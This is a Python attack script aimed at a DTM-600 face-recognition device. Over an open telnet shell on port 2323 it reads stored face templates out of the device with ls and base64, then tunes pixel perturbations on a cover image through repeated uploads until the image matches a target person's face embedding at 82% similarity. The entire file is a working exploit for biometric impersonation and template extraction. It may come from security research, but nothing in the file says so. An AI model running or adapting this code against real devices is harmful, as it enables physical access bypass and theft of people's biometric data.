#!/usr/bin/env python3
"""
Semi-Automated Adversarial Attack for DTM-600
User uploads images manually via web UI, script extracts templates and generates perturbations.

Workflow:
    1. Script generates perturbed image -> saves to ADVERSARIAL_RESULTS/next_upload.jpg
    2. User uploads via web UI to library 3
    3. User runs: python3 adversarial_manual.py --check
    4. Script extracts latest template, computes similarity, generates next perturbation
    5. Repeat until >82% achieved

Usage:
    # Initialize with cover image
    python3 adversarial_manual.py --init --cover CANDIDATE_FACES/large_02_face.jpg

    # After each upload, check and generate next
    python3 adversarial_manual.py --check

    # View current status
    python3 adversarial_manual.py --status
"""

import argparse
import base64
import json
import numpy as np
import pickle
import socket
import struct
import time
from datetime import datetime
from pathlib import Path

try:
    import cv2
    HAS_CV2 = True
except ImportError:
    HAS_CV2 = False

try:
    from PIL import Image
    HAS_PIL = True
except ImportError:
    HAS_PIL = False


DEVICE_IP = "192.168.30.178"
TARGET_TEMPLATE = "user_target_template.bin"
STATE_FILE = "ADVERSARIAL_RESULTS/attack_state.pkl"
OUTPUT_DIR = Path("ADVERSARIAL_RESULTS")
LIB_ID = 3
TARGET_SIM = 0.82
EPSILON = 16
STEP_SIZE = 4


def load_image(path):
    if HAS_CV2:
        return cv2.imread(path)
    elif HAS_PIL:
        img = np.array(Image.open(path))
        if len(img.shape) == 3 and img.shape[2] == 3:
            img = img[:, :, ::-1]  # RGB to BGR
        return img
    raise RuntimeError("No image library")


def save_image(path, img):
    if HAS_CV2:
        cv2.imwrite(str(path), img)
    elif HAS_PIL:
        if len(img.shape) == 3 and img.shape[2] == 3:
            img = img[:, :, ::-1]
        Image.fromarray(img).save(str(path))


def load_target_template(path):
    """Load and normalize target template."""
    data = Path(path).read_bytes()
    if len(data) != 1044:
        raise ValueError(f"Invalid template size: {len(data)}")
    embedding = np.frombuffer(data[20:], dtype=np.float32).copy()
    norm = np.linalg.norm(embedding)
    if norm > 0:
        embedding /= norm
    return embedding


def get_latest_template():
    """Extract the most recently created template from device."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    sock.connect((DEVICE_IP, 2323))
    time.sleep(0.3)
    sock.recv(4096)

    # Find most recent template file
    cmd = f"ls -t /data/WorkLibFile/{LIB_ID}/PersonID_*/FaceID_*.bin 2>/dev/null | head -1\n"
    sock.send(cmd.encode())
    time.sleep(1)
    result = sock.recv(4096).decode('utf-8', errors='ignore')

    lines = [l.strip() for l in result.split('\n') if '.bin' in l and 'FaceID' in l]
    if not lines:
        sock.close()
        return None, None

    template_path = lines[0]

    # Extract face_id from path
    face_id = template_path.split('FaceID_')[-1].replace('.bin', '')

    # Get template via base64
    sock.send(f"base64 {template_path}\n".encode())
    time.sleep(2)

    b64_output = b""
    while True:
        try:
            sock.settimeout(2)
            chunk = sock.recv(8192)
            if not chunk:
                break
            b64_output += chunk
        except socket.timeout:
            break

    sock.close()

    # Parse base64
    b64_text = b64_output.decode('utf-8', errors='ignore').replace('\r', '')
    lines = b64_text.split('\n')
    b64_lines = []
    capture = False
    for line in lines:
        line = line.strip()
        if 'base64' in line:
            capture = True
            continue
        if line.startswith('/ #') or line.startswith('~ #'):
            break
        if capture and line:
            b64_lines.append(line)

    b64_data = ''.join(b64_lines)

    try:
        template_data = base64.b64decode(b64_data)
    except:
        return None, None

    if len(template_data) != 1044:
        return None, None

    embedding = np.frombuffer(template_data[20:], dtype=np.float32).copy()
    return embedding, face_id


def compute_similarity(emb1, emb2):
    """Cosine similarity."""
    norm1 = np.linalg.norm(emb1)
    norm2 = np.linalg.norm(emb2)
    if norm1 == 0 or norm2 == 0:
        return 0.0
    return float(np.dot(emb1/norm1, emb2/norm2))


def delete_person(face_id):
    """Delete a person entry via telnet."""
    # We'd need to find the PersonID from FaceID - skip for now
    pass


class AttackState:
    def __init__(self):
        self.cover_image = None
        self.perturbation = None
        self.best_sim = 0.0
        self.best_perturbation = None
        self.query_count = 0
        self.history = []
        self.last_face_id = None

    def save(self):
        OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
        with open(STATE_FILE, 'wb') as f:
            pickle.dump(self, f)

    @staticmethod
    def load():
        if Path(STATE_FILE).exists():
            with open(STATE_FILE, 'rb') as f:
                return pickle.load(f)
        return None


def init_attack(cover_path):
    """Initialize attack with cover image."""
    print(f"[*] Initializing attack with {cover_path}")

    cover = load_image(cover_path)
    if cover is None:
        print("[!] Failed to load cover image")
        return

    state = AttackState()
    state.cover_image = cover.astype(np.float32)
    state.perturbation = np.zeros_like(cover, dtype=np.float32)
    state.best_perturbation = state.perturbation.copy()

    # Generate first image (unperturbed)
    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
    next_path = OUTPUT_DIR / "next_upload.jpg"
    save_image(next_path, cover)

    state.save()

    print(f"[+] Initialized. Cover image: {cover.shape}")
    print(f"[+] First image saved to: {next_path}")
    print(f"\n>>> Upload {next_path} via web UI, then run: python3 {__file__} --check")


def check_and_iterate():
    """Check latest template and generate next perturbation."""
    state = AttackState.load()
    if state is None:
        print("[!] No attack state. Run --init first.")
        return

    # Load target
    target = load_target_template(TARGET_TEMPLATE)

    # Get latest template from device
    print("[*] Extracting latest template from device...")
    embedding, face_id = get_latest_template()

    if embedding is None:
        print("[!] Failed to extract template. Make sure you uploaded the image.")
        return

    # Check if this is a new upload
    if face_id == state.last_face_id:
        print(f"[!] Same face_id as before ({face_id}). Upload the new image first.")
        return

    state.last_face_id = face_id
    state.query_count += 1

    # Compute similarity
    sim = compute_similarity(embedding, target)
    print(f"[+] Query #{state.query_count}: Similarity = {sim:.4f} ({sim*100:.2f}%)")

    state.history.append({
        'query': state.query_count,
        'face_id': face_id,
        'similarity': sim
    })

    # Check success
    if sim >= TARGET_SIM:
        print(f"\n[+] SUCCESS! Achieved {sim:.4f} >= {TARGET_SIM}")
        print(f"[+] Face ID: {face_id}")

        # Save winning image
        winner_path = OUTPUT_DIR / f"SUCCESS_sim{sim:.4f}_{face_id}.jpg"
        current = np.clip(state.cover_image + state.perturbation, 0, 255).astype(np.uint8)
        save_image(winner_path, current)
        print(f"[+] Winning image saved to: {winner_path}")

        state.save()
        return

    # Update best
    if sim > state.best_sim:
        print(f"[+] New best! {state.best_sim:.4f} -> {sim:.4f}")
        state.best_sim = sim
        state.best_perturbation = state.perturbation.copy()
    else:
        # Revert to best perturbation and try different direction
        print(f"[-] No improvement (best: {state.best_sim:.4f}). Reverting and trying new direction.")
        state.perturbation = state.best_perturbation.copy()

    # Generate next perturbation (SimBA-style)
    h, w = state.cover_image.shape[:2]
    channels = state.cover_image.shape[2] if len(state.cover_image.shape) == 3 else 1

    # Random coordinate and direction
    y = np.random.randint(0, h)
    x = np.random.randint(0, w)
    c = np.random.randint(0, channels) if channels > 1 else 0
    direction = np.random.choice([-1, 1])

    # Apply step
    if channels > 1:
        old_val = state.perturbation[y, x, c]
        new_val = np.clip(old_val + direction * STEP_SIZE, -EPSILON, EPSILON)
        state.perturbation[y, x, c] = new_val
    else:
        old_val = state.perturbation[y, x]
        new_val = np.clip(old_val + direction * STEP_SIZE, -EPSILON, EPSILON)
        state.perturbation[y, x] = new_val

    # Generate next image
    next_img = np.clip(state.cover_image + state.perturbation, 0, 255).astype(np.uint8)
    next_path = OUTPUT_DIR / "next_upload.jpg"
    save_image(next_path, next_img)

    state.save()

    print(f"\n[*] Next image saved to: {next_path}")
    print(f">>> Upload it via web UI, then run: python3 {__file__} --check")


def show_status():
    """Show current attack status."""
    state = AttackState.load()
    if state is None:
        print("[!] No attack state. Run --init first.")
        return

    print("=" * 50)
    print("ATTACK STATUS")
    print("=" * 50)
    print(f"Queries: {state.query_count}")
    print(f"Best similarity: {state.best_sim:.4f} ({state.best_sim*100:.2f}%)")
    print(f"Target: {TARGET_SIM:.0%}")
    print(f"Last face_id: {state.last_face_id}")

    if state.history:
        print(f"\nRecent history:")
        for h in state.history[-5:]:
            print(f"  #{h['query']}: {h['similarity']:.4f} (FaceID: {h['face_id']})")


def main():
    parser = argparse.ArgumentParser(description="Semi-automated adversarial attack")
    parser.add_argument("--init", action="store_true", help="Initialize attack")
    parser.add_argument("--cover", help="Cover image path (for --init)")
    parser.add_argument("--check", action="store_true", help="Check latest upload and generate next")
    parser.add_argument("--status", action="store_true", help="Show attack status")
    parser.add_argument("--target", default=DEVICE_IP, help="Device IP")
    parser.add_argument("--template", default=TARGET_TEMPLATE, help="Target template file")

    args = parser.parse_args()

    global DEVICE_IP, TARGET_TEMPLATE
    DEVICE_IP = args.target
    TARGET_TEMPLATE = args.template

    if args.init:
        if not args.cover:
            print("[!] --cover required with --init")
            return
        init_attack(args.cover)
    elif args.check:
        check_and_iterate()
    elif args.status:
        show_status()
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
